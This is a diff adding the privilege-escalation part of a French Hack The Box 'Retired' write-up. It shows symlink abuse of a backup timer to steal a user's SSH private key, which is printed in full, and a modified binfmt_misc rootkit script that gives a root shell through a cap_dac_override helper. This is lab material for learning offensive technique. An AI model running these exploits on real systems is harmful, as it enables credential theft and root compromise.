@@ -359,3 +359,405 @@ www-data@retired:/var/www$
 A partir de là on va pouvoir privesc.
 
 # PRIVILEGE ESCALATION
+
+
+## WWW-DATA
+
+ici, après quelques recherche on trouve un service qui tourne toutes les minutes et qui fait des backups.
+
+```
+www-data@retired:/etc/systemd/system$ cat /etc/systemd/system/website_backup.*
+[Unit]
+Description=Backup and rotate website
+
+[Service]
+User=dev
+Group=www-data
+ExecStart=/usr/bin/webbackup
+
+[Install]
+WantedBy=multi-user.target
+[Unit]
+Description=Regularly backup the website as long as it is still under development
+
+[Timer]
+OnCalendar=minutely
+
+[Install]
+WantedBy=multi-user.target
+```
+
+on a donc un script /usr/bin/webbackup executé chaques minutes par l'utilisateur dev et qui va faire des backups
+
+```bash
+#!/bin/bash
+set -euf -o pipefail
+
+cd /var/www/
+
+SRC=/var/www/html
+DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
+
+/usr/bin/rm --force -- "$DST"
+/usr/bin/zip --recurse-paths "$DST" "$SRC"
+
+KEEP=10
+/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
+    | sort --zero-terminated --numeric-sort --reverse \
+    | while IFS= read -r -d '' backup; do
+        if [ "$KEEP" -le 0 ]; then
+            /usr/bin/rm --force -- "$backup"
+        fi
+        KEEP="$((KEEP-1))"
+    done
+```
+
+```
+www-data@retired:/var/www$ cd /var/www/; ls
+2022-06-28_12-45-01-html.zip  2022-06-28_12-46-01-html.zip  2022-06-28_12-47-03-html.zip  html  license.sqlite  var
+```
+
+```
+www-data@retired:/tmp$ ln -s /etc/passwd zebi
+www-data@retired:/tmp$ zip test.zip zebi 
+  adding: zebi (deflated 64%)
+www-data@retired:/tmp$ unzip test.zip 
+Archive:  test.zip
+zebi exists and is a symbolic link.
+replace zebi? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
+  inflating: zebi                    
+www-data@retired:/tmp$ ls -l zebi
+-rw-r--r-- 1 www-data www-data 1488 Oct 13  2021 zebi
+www-data@retired:/tmp$ cat zebi 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
+_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+vagrant:x:1000:1000::/vagrant:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+dev:x:1001:1001::/home/dev:/bin/bash
+```
+
+ici premièrement on fait un lien symbolique vers /etc/passwd
+ensuite on va zipper ce lien symbolique puis le dézipper
+et on va se rendre compte que l'on a zipper le fichier /etc/passwd et lorsqu'on l'a dézipper on a récupéré son contenu et ce n'est plus un lien symbolique.
+
+à partir de là, on va pouvoir exploiter notre script de backup.
+
+```
+ln -s /home/dev/.ssh/id_rsa /var/www/html/id_rsa
+```
+
+on va ensuite attendre que le script soit executé.
+
+```
+www-data@retired:/var/www$ ls
+2022-06-28_13-02-03-html.zip  2022-06-28_13-04-01-html.zip  html	    var
+2022-06-28_13-03-03-html.zip  2022-06-28_13-05-03-html.zip  license.sqlite
+www-data@retired:/var/www$ unzip -d /tmp 2022-06-28_13-05-03-html.zip
+Archive:  2022-06-28_13-05-03-html.zip
+   creating: /tmp/var/www/html/
+   creating: /tmp/var/www/html/js/
+  inflating: /tmp/var/www/html/js/scripts.js  
+   creating: /tmp/var/www/html/.ssh/
+  inflating: /tmp/var/www/html/activate_license.php  
+   creating: /tmp/var/www/html/assets/
+  inflating: /tmp/var/www/html/assets/favicon.ico  
+   creating: /tmp/var/www/html/assets/img/
+  inflating: /tmp/var/www/html/assets/img/close-icon.svg  
+  inflating: /tmp/var/www/html/assets/img/navbar-logo.svg  
+   creating: /tmp/var/www/html/assets/img/about/
+  inflating: /tmp/var/www/html/assets/img/about/2.jpg  
+  inflating: /tmp/var/www/html/assets/img/about/4.jpg  
+  inflating: /tmp/var/www/html/assets/img/about/3.jpg  
+  inflating: /tmp/var/www/html/assets/img/about/1.jpg  
+   creating: /tmp/var/www/html/assets/img/logos/
+  inflating: /tmp/var/www/html/assets/img/logos/facebook.svg  
+  inflating: /tmp/var/www/html/assets/img/logos/microsoft.svg  
+  inflating: /tmp/var/www/html/assets/img/logos/google.svg  
+  inflating: /tmp/var/www/html/assets/img/logos/ibm.svg  
+   creating: /tmp/var/www/html/assets/img/team/
+  inflating: /tmp/var/www/html/assets/img/team/2.jpg  
+  inflating: /tmp/var/www/html/assets/img/team/3.jpg  
+  inflating: /tmp/var/www/html/assets/img/team/1.jpg  
+  inflating: /tmp/var/www/html/assets/img/header-bg.jpg  
+  inflating: /tmp/var/www/html/beta.html  
+  inflating: /tmp/var/www/html/default.html  
+  inflating: /tmp/var/www/html/index.php  
+  inflating: /tmp/var/www/html/id_rsa  
+   creating: /tmp/var/www/html/css/
+  inflating: /tmp/var/www/html/css/styles.css  
+www-data@retired:/var/www$ cd /tmp/var/www/html/
+www-data@retired:/tmp/var/www/html$ ls
+activate_license.php  beta.html  default.html  index.php
+assets		      css	 id_rsa        js
+www-data@retired:/tmp/var/www/html$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEA2090vSkzICytlOHL9EbguWPhsai40A3RzSYDlldalPTp/0G8ge3I
+j6Wslike4GM7149go4dhKOCmP6b1aL/wIg2Ig56ZN3j2wn7oxDYl2CsJFusuDLlK+vuT9W
+zrv4YnzvPL0RVMIsbGdzevaaRNsGc4mk6xOpsIFsQngj4dVpeJzOhPHu0W0CEgXhK6SHJP
+6oTRKpxrY4IupwGG/P6bl0QUaVWkVFOhCwdlOkuCCGFSMsimLHDpUT7g2Sa9aZdBao21Rd
+0C4pYVy/MmheDdGzkUB/uCNYRf65rfdMXxQ67cVFOI62OubpNn/YCtkmLOI9RbQV+YHTRm
+FqbNgfYqc3rj4wGLYYZh7PeZq/rKa+aCmvSsxTnVKKZX5wTxms6ejhGxTnpydK4LyXMnYN
++JYwNHZYzN68NHii0vgzidv0K6U48y+OdNvJnPPtkdqOroZoXBMj5ZaEvNRDdoKZVddJqi
+0EfCDkKwW9BUiJyqBYFDoIFgJ0VVJNCSKywQPF+XAAAFiL1YrcW9WK3FAAAAB3NzaC1yc2
+EAAAGBANtPdL0pMyAsrZThy/RG4Llj4bGouNAN0c0mA5ZXWpT06f9BvIHtyI+lrJYpHuBj
+O9ePYKOHYSjgpj+m9Wi/8CINiIOemTd49sJ+6MQ2JdgrCRbrLgy5Svr7k/Vs67+GJ87zy9
+EVTCLGxnc3r2mkTbBnOJpOsTqbCBbEJ4I+HVaXiczoTx7tFtAhIF4SukhyT+qE0Sqca2OC
+LqcBhvz+m5dEFGlVpFRToQsHZTpLgghhUjLIpixw6VE+4NkmvWmXQWqNtUXdAuKWFcvzJo
+Xg3Rs5FAf7gjWEX+ua33TF8UOu3FRTiOtjrm6TZ/2ArZJiziPUW0FfmB00ZhamzYH2KnN6
+4+MBi2GGYez3mav6ymvmgpr0rMU51SimV+cE8ZrOno4RsU56cnSuC8lzJ2DfiWMDR2WMze
+vDR4otL4M4nb9CulOPMvjnTbyZzz7ZHajq6GaFwTI+WWhLzUQ3aCmVXXSaotBHwg5CsFvQ
+VIicqgWBQ6CBYCdFVSTQkissEDxflwAAAAMBAAEAAAGBAMXvD3COV6tJR5zgsaAVvEr2P8
+OFgM+eOWWLUp+E1acs6GhN3yHxBxvGrl6UXF6ukVr694B/9gvbvZAjUsiousUxK62HHce4
+MBXYTqKQMFXKeZiqx9QKBAdDugU+ugMQxKr+1EwviZi1iHge1P1mogt9DdQPA9veAk3x2a
+qt/vKhMGi0nnxOBVHxI/JjuqcaLNB/8PwhUrbrzslCEqAR90Ft23I6LmdBV07J7O3RKln/
+5B0bhQcFHT8Lngm+8iLztBYPAygMETHOgCaf9lTunMNJ70nCx84MlS9VbB1kSwutmisCaf
+Hgm/7VreFsLIlBjtGeklrKUggr74XiRJl50LC/KUXzcVkvrc2UK4QX9esaCNeBOnDMoD9t
+gvfZtI8fjYqQ08PMD2eCHUQY+yaxa1QXPHqhAAxJV/5xkZKZmrkq8qinv3HrJ9qtKyCFo/
+N9f/mCpcb81Y266BOQ91uRVBh3g23XG6n9EK3nCwqIyEtChT5dHdhFkvVMW7Wh5o+FEQAA
+AMB0atziCxqeBAq+3j/I3r13LUnfVmLesWvY6jJFl5zgaHeRiH88JhlVbUVes8to4q284Y
+0+yH+U7339MGytMIFE6oWmO08qojojSvs1w3gcQiVea2l+vM3fCcllY7XUz6djLjiowqrc
+AMlULmLSmXVXJogfYb15f6P9s5VN32hKFAR7hyZniTZs/uvPYOm6C+joqn2qSdxgtdYcip
+aU7IBfVJWxtg8aM6eXzxnZIMPbbNUnakdthTTtVeJDQiz8ELsAAADBAO0UJvhVae6hdtbF
+QCA7AkBCyFWSW7efNzhkal2QEDyYMtonvGN8yV7i9NoIIO3bAPNM863ZJCohaVdFiGztEb
+aUzsJWFxslIvj67+2v1GQ5IFpPBwYNKAXwjsAZqw5yREMH/BIxJ2kT5frFBpnqFgjuagJ0
+suSXr7HZaHWGbXAYjmoj6h2JsyYAVKONaqkgyWTF+AunZNLVduplVL8sa2/fsGHlb056WX
+N7EFkiXadFFe0LrxMdkubOIUScihfIrwAAAMEA7NBFlShxtgbZ0rJ8WgBWp8aIez2iN/O/
+ck1irhAfnr/VUnRQz+1POxemKnXhEFeEdusvAunTZw/SCyBJT9E+DUsBBNz8yr6dc17OOk
+j+/jztoXyoHTW3qCdW0y+Ev1p3lbm8scE2xkt28/3DXKV31Eb9ZeABurNXYBHjH+CffCOS
+bp4S6L7RNp7a7/vU5D+I7EMTc7aCRwtq/UK8QmTlUiOhS8UzIvp36vGvzwPNIb877qGdwJ
+ZjGoA1uj9VP0GZAAAAC2RldkByZXRpcmVkAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
+www-data@retired:/tmp/var/www/html$ 
+```
+
+parfait ! On a récupéré une clé rsa afin de pouvoir se login en tant que dev.
+
+## dev
+
+Bon, le writeup devient long et cette box commence à me souler donc je vais être speed sur la deuxième partie.
+
+```
+root@debian:~# ssh -i htb-retired_id_rsa_dev dev@10.10.11.154
+Linux retired 5.10.0-11-amd64 #1 SMP Debian 5.10.92-2 (2022-02-28) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jun 28 13:04:22 2022 from 10.10.14.13
+dev@retired:~$ ls
+activate_license  emuemu  exploit.sh  user.txt
+dev@retired:~$ ls emuemu/
+Makefile  README.md  emuemu  emuemu.c  reg_helper  reg_helper.c  test
+dev@retired:~$ cat emuemu/reg_helper.c 
+#define _GNU_SOURCE
+
+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main(void) {
+    char cmd[512] = { 0 };
+
+    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;
+
+    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
+    if (-1 == fd)
+        perror("open");
+    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
+        perror("write");
+    if (close(fd) == -1)
+        perror("close");
+
+    return 0;
+}
+dev@retired:~$ 
+```
+
+donc ici on se login en tant que dev, ensuite on trouve un dossier emuemu.
+
+on trouve ensuite un programme en C qui va écrire dans /proc/sys/fs/binfmt_misc/register
+
+```
+dev@retired:~$ cat emuemu/Makefile 
+CC := gcc
+CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion
+
+SOURCES := $(wildcard *.c)
+TARGETS := $(SOURCES:.c=)
+
+.PHONY: install clean
+
+install: $(TARGETS)
+	@echo "[+] Installing program files"
+	install --mode 0755 emuemu /usr/bin/
+	mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
+	install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
+	setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper
+
+	@echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
+	echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
+		| tee /usr/lib/binfmt.d/emuemu.conf \
+		| /usr/lib/emuemu/reg_helper
+
+clean:
+	rm -f -- $(TARGETS)
+```
+
+on voit que dans le Makefile il lui set la capabilites cap_dac_override https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override
+
+**This mean that you can bypass write permission checks on any file, so you can write any file.**
+
+on peut donc écrire dans le fichier /proc/sys/fs/binfmt_misc/register
+
+ensuite on trouve cet exploit : https://github.com/toffan/binfmt_misc
+
+que l'ont va modifier un peu
+
+```bash
+#!/bin/bash
+
+readonly searchsuid="/bin/"
+readonly mountpoint="/proc/sys/fs/binfmt_misc"
+readonly exe="$0"
+
+
+warn()
+{
+    1>&2 echo $@
+}
+
+die()
+{
+    warn $@
+    exit -1
+}
+
+usage()
+{
+    cat 1>&2 <<EOF
+Usage: $exe
+    Gives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable,
+    note that it must be enforced by any other mean before your try this, for
+    example by typing something like "sudo chmod +6 /*/*/f*/*/*r" while Dave is
+    thinking that you are fixing his problem.
+EOF
+    exit 1
+}
+
+function not_writeable()
+{
+	test ! -w "$mountpoint/register"
+}
+
+function pick_suid()
+{
+	find "$1" -perm -4000 -executable \
+	    | tail -n 1
+}
+
+function read_magic()
+{
+    [[ -e "$1" ]] && \
+    [[ "$2" =~ [[:digit:]]+ ]] && \
+    dd if="$1" bs=1 count="$2" status=none \
+        | sed -e 's-\x00-\\x00-g'
+}
+
+[[ -n "$1" ]] && usage
+
+# not_writeable && die "Error: $mountpoint/register is not writeable"
+
+target="$(pick_suid "$searchsuid")"
+test -e "$target" || die "Error: Unable to find a suid binary in $searchsuid"
+
+binfmt_magic="$(read_magic "$target" "126")"
+test -z "$binfmt_magic" && die "Error: Unable to retrieve a magic for $target"
+
+fmtname="$(mktemp -u XXXX)"
+fmtinterpr="$(mktemp)"
+
+gcc -o "$fmtinterpr" -xc - <<- __EOF__
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include <stdio.h>
+	#include <pwd.h>
+
+	int main(int argc, char *argv[])
+	{
+		// remove our temporary file
+		unlink("$fmtinterpr");
+
+		// remove the unused binary format
+		FILE* fmt = fopen("$mountpoint/$fmtname", "w");
+		fprintf(fmt, "-1\\n");
+		fclose(fmt);
+
+		// MOTD
+		setuid(0);
+		uid_t uid = getuid();
+		uid_t euid = geteuid();
+		struct passwd *pw = getpwuid(uid);
+		struct passwd *epw = getpwuid(euid);
+		fprintf(stderr, "uid=%u(%s) euid=%u(%s)\\n",
+			uid,
+			pw->pw_name,
+			euid,
+			epw->pw_name);
+
+		// welcome home
+		char* sh[] = {"/bin/sh", (char*) 0};
+		execvp(sh[0], sh);
+		return 1;
+	}
+__EOF__
+
+chmod a+x "$fmtinterpr"
+
+binfmt_line="_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC"
+echo "$binfmt_line" | /usr/lib/emuemu/reg_helper
+
+exec "$target"
+```
+
+ensuite on va l'executer
+
+```
+dev@retired:/tmp$ ./binfmt_rootkit
+uid=0(root) euid=0(root)
+# cd /root     	
+# ls 
+cleanup.sh  root.txt
+# cat root.txt
+71f643297b178855e1bca48141e773cc
+```
+et magie ! on est enfin root !
